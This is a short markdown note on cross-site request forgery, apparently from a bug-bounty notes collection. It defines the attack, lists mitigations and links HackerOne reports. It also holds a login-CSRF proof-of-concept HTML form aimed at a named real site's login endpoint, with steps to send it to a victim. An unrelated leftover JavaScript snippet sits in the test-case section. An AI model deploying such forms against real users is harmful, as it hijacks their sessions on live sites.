# CSRF

>Cross Site Request Forgery is an attack that forces an end user to execute unwanted action on a web application in which they are currently authenticated.

## Prerequisites:
> User should have active session.

## Mitigation

1. CSRF Token: Token is added in hidden form field, unique per session, large random value.
1. Synchronizer Token Pattern
2. Encryption Based Token Pattern
3. Hash Based Token Pattern
4. Same Site Cookie Attribute
5. Double Submit Cookie (Cookie & request parameter).
6. Re-authentication, One-time token, Captcha (Strong CSRF defense).

## Test Cases:


1. Create a CSRF login POC using the following code.

```javascript
if (isAwesome){
  return true
}
```

```<html>
<body>
<form action="https://unikrn.com/apiv1/login" method="POST">
<input type="hidden" name="usr" value="[email]">
<input type="hidden" name="pwd" value="[password]">
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```
2. Replace the email and password with the valid credentials.
3. Send the script to the victim to make them click.

## Example/POC :

* [CSRF logs the victim into attacker's account](https://hackerone.com/reports/339352)
* [CSRF: add item to victim's cart automatically (starbucks.com - updatecart)](https://hackerone.com/reports/177472)
* [login csrf in analytics.mopub.com](https://hackerone.com/reports/577920)
* [CSRF at (Apply to this program) that lead to submit your request automatic with out any validations](https://hackerone.com/reports/334253)
